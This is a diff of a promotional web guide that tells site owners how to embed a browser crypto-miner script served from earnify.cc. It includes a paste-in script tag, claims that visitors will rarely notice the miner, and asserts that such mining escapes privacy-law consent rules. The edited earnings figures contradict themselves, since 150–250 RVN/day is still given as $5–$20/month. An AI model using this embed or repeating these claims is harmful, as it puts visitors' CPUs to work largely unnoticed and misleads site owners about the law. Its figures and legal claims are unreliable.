@@ -394,7 +394,7 @@
 &lt;/script&gt;</code></pre>
 
         <h3 id="step-4">4. Monitor your earnings</h3>
-        <p>Your zpool dashboard shows real-time hashrate, accepted shares, and unpaid balance. Payouts to your wallet happen automatically once you reach zpool's minimum threshold (typically 10 RVN).</p>
+        <p>Your zpool dashboard shows real-time hashrate, accepted shares, and unpaid balance. Payouts to your wallet happen automatically once you reach zpool's minimum threshold (typically 0.05 RVN).</p>
         <p>That is it. For a zero-setup version with a hosted dashboard, visit <a href="https://earnify.cc" style="color:#dfe104;">earnify.cc</a> — no account or configuration needed.</p>
 
         <div style="background:#0c0c0f;border:2px solid #27272a;padding:1.5rem;margin:1.5rem 0 2.5rem;">
@@ -453,7 +453,7 @@
             <!-- Highlighted script block -->
             <rect x="56" y="262" width="268" height="68" rx="4" fill="rgba(223,225,4,0.08)" stroke="#dfe104" stroke-width="1" stroke-dasharray="3,2"/>
             <text x="72" y="278" fill="#dfe104" font-family="monospace" font-size="9" font-weight="600">&lt;!-- Insert mining script here --&gt;</text>
-            <text x="72" y="294" fill="#a5f3fc" font-family="monospace" font-size="9">&lt;script src="cdn.earnify.cc/miner.js"&gt;</text>
+            <text x="72" y="294" fill="#a5f3fc" font-family="monospace" font-size="9">&lt;script src="https://earnify.cc/miner.js"&gt;</text>
             <text x="72" y="310" fill="#a5f3fc" font-family="monospace" font-size="9">&lt;/script&gt;</text>
             <text x="72" y="326" fill="#e2e8f0" font-family="monospace" font-size="9">&lt;/body&gt;</text>
 
@@ -500,7 +500,7 @@
         <p>Yes, as long as you disclose it to users. Because modern privacy-first miners collect <strong>zero personal data</strong> — no cookies, no IP logging, no fingerprinting — they operate outside GDPR and CCPA consent mandates in most interpretations. That said, always disclose mining in your privacy policy and offer an opt-out. The handful of regulators who have opined on the matter focus on <em>unauthorized</em> mining (cryptojacking), not transparent, opt-in compute monetization.</p>
 
         <h3 id="faq-earnings">How much can I realistically earn?</h3>
-        <p>At current (mid-2026) difficulty and RVN prices, a site with <strong>1,000 daily visitors</strong> running MinotaurX earns approximately <strong>0.3–0.8 RVN/day</strong> — roughly $5–$20/month. A site with <strong>10,000 daily visitors</strong> earns <strong>2.5–7 RVN/day</strong> — roughly $50–$200/month. These figures move with crypto markets and network difficulty. Browser mining is best treated as <strong>supplemental passive income</strong>, not a primary revenue source.</p>
+        <p>At current (mid-2026) difficulty and RVN prices, a site with <strong>1,000 daily visitors</strong> running MinotaurX earns approximately <strong>150–250 RVN/day</strong> — roughly $5–$20/month. A site with <strong>10,000 daily visitors</strong> earns <strong>1500–2500 RVN/day</strong> — roughly $50–$200/month. These figures move with crypto markets and network difficulty. Browser mining is best treated as <strong>supplemental passive income</strong>, not a primary revenue source.</p>
 
         <h3 id="faq-performance">Does mining affect my visitors' experience?</h3>
         <p>Modern browser miners run in <strong>Web Workers</strong> on separate CPU threads. The main thread — responsible for rendering, interaction, and layout — is never blocked. Thread limiting (<code>n−1</code>) and configurable throttling (default 30% idle CPU) ensure the browser remains responsive. Battery-aware detection pauses mining on unplugged laptops at low battery. In practice, the vast majority of visitors will never notice the miner running.</p>
